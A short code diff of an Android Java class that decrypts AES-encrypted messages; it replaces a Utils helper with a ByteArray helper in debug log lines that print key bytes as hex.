@@ -17,8 +17,8 @@ import android.content.Context;
 import android.content.res.Resources;
 
 import com.android.networking.auto.Cfg;
+import com.android.networking.util.ByteArray;
 import com.android.networking.util.Check;
-import com.android.networking.util.Utils;
 
 public class MessagesDecrypt {
 	private static final String TAG = "MessageDecrypt";
@@ -47,7 +47,7 @@ public class MessagesDecrypt {
 
 			SecretKey secret = new SecretKeySpec(aes_key, "AES");
 			if (Cfg.DEBUG) {
-				Check.log(" produced key: " + Utils.byteArrayToHex(aes_key)); //$NON-NLS-1$
+				Check.log(" produced key: " + ByteArray.byteArrayToHex(aes_key)); //$NON-NLS-1$
 			}
 
 			return secret;
@@ -91,7 +91,7 @@ public class MessagesDecrypt {
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (init): stream=" + stream.available());
-				Check.log(TAG + " (init): key=" + Utils.byteArrayToHex(key.getEncoded()));
+				Check.log(TAG + " (init): key=" + ByteArray.byteArrayToHex(key.getEncoded()));
 			}
 
 			Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding"); //$NON-NLS-1$
